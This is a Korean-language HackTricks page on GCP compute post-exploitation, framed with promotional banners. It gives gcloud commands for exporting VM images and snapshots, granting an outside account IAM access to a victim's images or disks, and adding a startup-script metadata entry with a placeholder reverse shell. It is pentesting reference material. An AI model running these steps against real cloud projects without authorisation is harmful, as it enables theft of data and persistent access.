# GCP - 컴퓨트 후 익스플로잇

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.

</details>

## 컴퓨트

컴퓨트 및 VPC (네트워킹)에 대한 자세한 정보는 다음을 확인하세요:

{% content-ref url="../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-pentesting/gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

### 이미지 내보내기 및 로컬에서 검사하기

이를 통해 공격자는 이미 존재하는 이미지 내에 포함된 데이터에 **접근**하거나 **실행 중인 가상 머신의 새 이미지를 생성**하고 실행 중인 가상 머신에 대한 액세스 없이 데이터에 접근할 수 있습니다.

가상 머신 이미지를 버킷으로 내보내고, 해당 이미지를 다운로드하여 로컬에서 마운트할 수 있습니다. 명령어는 다음과 같습니다:

{% code overflow="wrap" %}
```bash
gcloud compute images export --destination-uri gs://<bucket-name>/image.vmdk --image imagetest --export-format vmdk
# The download the export from the bucket and mount it locally
```
{% endcode %}

이 작업을 수행하기 위해서는 공격자는 저장 버킷에 대한 권한과 확실히 **cloudbuild에 대한 권한**이 필요합니다. 왜냐하면 이 서비스가 내보내기 작업을 수행하기 위해 요청될 것이기 때문입니다. 
또한, 이 작업이 작동하려면 codebuild SA와 compute SA가 특권 권한을 갖고 있어야 합니다.
cloudbuild SA `<project-id>@cloudbuild.gserviceaccount.com`은 다음과 같은 권한이 필요합니다:

* roles/iam.serviceAccountTokenCreator
* roles/compute.admin
* roles/iam.serviceAccountUser

그리고 SA `<project-id>-compute@developer.gserviceaccount.com`은 다음과 같은 권한이 필요합니다:

* roles/compute.storageAdmin
* roles/storage.objectAdmin

### 스냅샷 및 디스크 내보내기 및 검사

스냅샷과 디스크를 직접 내보낼 수는 없지만, 스냅샷을 디스크로 변환하고, 디스크를 이미지로 변환한 다음, **이전 섹션**을 따라 해당 이미지를 로컬에서 검사할 수 있습니다.

{% code overflow="wrap" %}
```bash
# Create a Disk from a snapshot
gcloud compute disks create [NEW_DISK_NAME] --source-snapshot=[SNAPSHOT_NAME] --zone=[ZONE]

# Create an image from a disk
gcloud compute images create [IMAGE_NAME] --source-disk=[NEW_DISK_NAME] --source-disk-zone=[ZONE]
```
{% endcode %}

### 이미지 검사를 통한 가상 머신 생성

공격자가 이미지를 생성한 위치에서 **이미지에 저장된 데이터** 또는 **실행 중인 가상 머신**에 저장된 데이터에 접근하는 것을 목표로 할 때, 외부 계정에 이미지에 대한 액세스 권한을 부여할 수 있습니다:
```bash
gcloud projects add-iam-policy-binding [SOURCE_PROJECT_ID] \
--member='serviceAccount:[TARGET_PROJECT_SERVICE_ACCOUNT]' \
--role='roles/compute.imageUser'
```
그리고 그것으로부터 새로운 VM을 생성하세요:
```bash
gcloud compute instances create [INSTANCE_NAME] \
--project=[TARGET_PROJECT_ID] \
--zone=[ZONE] \
--image=projects/[SOURCE_PROJECT_ID]/global/images/[IMAGE_NAME]
```
만약 이미지에 대한 외부 계정 액세스를 제공할 수 없다면, 피해자의 프로젝트에서 해당 이미지를 사용하여 가상 머신을 시작하고 메타데이터를 실행하여 역쉘에 액세스할 수 있습니다. 이를 위해 다음과 같은 매개변수를 추가하세요:
```bash
--metadata startup-script='#! /bin/bash
echo "hello"; <reverse shell>'
```
### 스냅샷/디스크 검사를 위해 VM에 연결하기

디스크나 스냅샷에 저장된 데이터에 접근하기 위해, 스냅샷을 디스크로 변환하거나 디스크를 이미지로 변환한 후 이전 단계를 따를 수 있습니다.

또는 외부 계정에 디스크에 대한 액세스 권한을 부여할 수 있습니다 (시작점이 스냅샷인 경우 스냅샷에 대한 액세스 권한을 부여하거나 스냅샷에서 디스크를 생성합니다):
```bash
gcloud projects add-iam-policy-binding [PROJECT_ID] \
--member='user:[USER_EMAIL]' \
--role='roles/compute.storageAdmin'
```
**인스턴스에 디스크를 연결**합니다:

```bash
gcloud compute instances attach-disk INSTANCE_NAME --disk DISK_NAME --zone ZONE
```
```bash
gcloud compute instances attach-disk [INSTANCE_NAME] \
--disk [DISK_NAME] \
--zone [ZONE]
```
VM 내에서 디스크를 마운트합니다:

1. **VM에 SSH로 접속**합니다:

```sh
gcloud compute ssh [INSTANCE_NAME] --zone [ZONE]
```
2. **디스크 식별**: VM 내부에 들어가면 디스크 장치를 나열하여 새로운 디스크를 식별합니다. 일반적으로 `/dev/sdb`, `/dev/sdc` 등으로 찾을 수 있습니다.
3. **디스크 포맷 및 마운트** (새로운 또는 원시 디스크인 경우):
*   마운트 포인트를 생성합니다:

```sh
sudo mkdir -p /mnt/disks/[MOUNT_DIR]
```
*   디스크를 마운트합니다:

```sh
sudo mount -o discard,defaults /dev/[DISK_DEVICE] /mnt/disks/[MOUNT_DIR]
```

스냅샷 또는 디스크에 외부 프로젝트에 액세스 권한을 부여할 수 없는 경우, 스냅샷/디스크와 동일한 프로젝트의 인스턴스 내에서 이 작업을 수행해야 할 수도 있습니다.

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
